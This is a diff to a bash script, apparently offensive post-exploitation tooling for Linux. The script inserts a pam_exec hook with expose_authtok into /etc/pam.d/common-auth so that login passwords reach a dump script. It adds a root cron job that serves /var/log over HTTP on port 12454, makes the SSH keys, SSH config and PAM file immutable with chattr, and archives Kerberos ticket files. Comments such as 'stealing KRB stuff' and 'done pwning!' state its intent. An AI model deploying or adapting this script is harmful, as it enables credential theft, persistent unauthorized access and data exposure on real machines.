@@ -1,7 +1,7 @@
 #!/bin/bash
-echo 'deployes a PAM.d backdoor'
+echo 'deployes a PAM.d sniffer'
 echo
-echo "backdooring PAM.d/common-auth"
+echo "sniffing from PAM.d/common-auth"
 echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/secdump.sh" >> /etc/pam.d/common-auth
 echo "done with that"
 echo "creating script"
@@ -11,6 +11,16 @@ echo "done with that"
 echo "making executable"
 chmod +x /opt/secdump.sh
 echo "done with that"
+echo "writing PyLogWeb"
+echo '#!/bin/bash' > /opt/pylogweb.sh
+echo 'cd /var/log' >> /opt/pylogweb.sh
+echo 'python3 -m http.server 12454' >> /opt/pylogweb.sh
+chmod +x /opt/pylogweb.sh
+echo "backing up crontab and adding fun"
+crontab -l > /tmp/rootcrontab
+echo '*/5 * * * * /opt/pylogweb.sh' >> /tmp/rootcrontab
+crontab -i /tmp/rootcrontab
+echo "fun installed"
 echo
 echo "done done - enjoy!"
 echo
@@ -29,6 +39,8 @@ chmod 600 /root/.ssh/authorized_keys
 chattr +i /root/.ssh/authorized_keys
 chattr +i /etc/ssh/sshd_config.d/custom.conf
 chattr +i /etc/pam.d/common-auth
+echo "stealing KRB stuff"
+tar -czvf /root/krb.tgz /tmp/krb*
 clear
-echo "done backdooring!"
+echo "done pwning!"
 echo
